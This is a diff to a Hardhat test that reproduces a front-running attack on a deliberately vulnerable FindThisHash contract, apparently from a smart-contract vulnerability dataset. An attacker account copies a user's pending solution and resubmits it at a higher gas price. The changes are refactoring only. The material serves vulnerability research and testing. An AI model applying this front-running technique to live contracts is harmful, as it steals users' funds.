@@ -2,21 +2,16 @@ const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers');
 const { expect } = require('chai');
 
 describe('attack front_running/FindThisHash.sol', function () {
-    let owner;
-    let user;
-    let attacker;
+    let owner, user, attacker;
     async function deployContracts() {
-      const [s1, s2, s3] = await ethers.getSigners();
-      owner = s1;
-      user = s2;
-      attacker = s3;
+      [owner, user, attacker] = await ethers.getSigners();
       const FindThisHash = await ethers.getContractFactory('contracts/dataset/front_running/FindThisHash.sol:FindThisHash');
       const victim = await FindThisHash.connect(owner).deploy({value: ethers.parseEther("1000")});  
       return {victim};
     }
 
 
-    it('front running control vulnerability', async function () {
+    it('front running vulnerability', async function () {
       const {victim} = await loadFixture(deployContracts);
 
       const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
@@ -32,8 +27,7 @@ describe('attack front_running/FindThisHash.sol', function () {
       // attacker sees tx1 and wants to claim the reward before it's reset
       const tx2 = await victim.connect(attacker).solve(solution, {gasPrice: 767532040});
 
-      await network.provider.send("evm_mine");
-      await network.provider.send("evm_mine");
+      await network.provider.send("hardhat_mine", ["0x2"]);
       await network.provider.send("evm_setAutomine", [true]);
 
       // owner's tx1 will be reverted since the attacker's tx2 was mined first
